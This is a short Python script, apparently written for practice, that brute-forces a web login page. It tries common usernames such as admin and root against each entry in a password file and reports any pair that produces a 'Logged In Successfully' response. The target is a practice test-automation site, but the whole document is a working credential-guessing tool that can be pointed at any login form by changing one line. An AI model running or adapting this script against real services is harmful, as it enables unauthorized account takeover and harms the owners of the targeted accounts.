
#useful for tasks where we need to identify or bruteforce credentials in a web application or a login page

import requests
import sys # for getting our own progress bar

target = "https://practicetestautomation.com/practice-test-login/"
usernames = ["admin", "administrator", "test", "root", "student"]
passwords = "password.txt"
needle = "Logged In Successfully" # output we get after suucessful login

for username in usernames:
	with open (passwords,"r") as password_list:
		for password in password_list:	
			password = password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {}: {}\r".format(username, password.decode()))
			# using the sys module we write out the username and password that we are trying to crack and we also use the carriage return (\r) to jumb to the start of the file
			sys.stdout.flush() #flushing the buffer after each write
			r = requests.post(target, data ={"username": username, "password": password}) # posting the value of username and password to the webpage
			if needle.encode() in r.content: #checking whether the needle Logged In Successfully is in the response content
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo password found for '{}'".format(username))
		sys.stdout.write("\n")
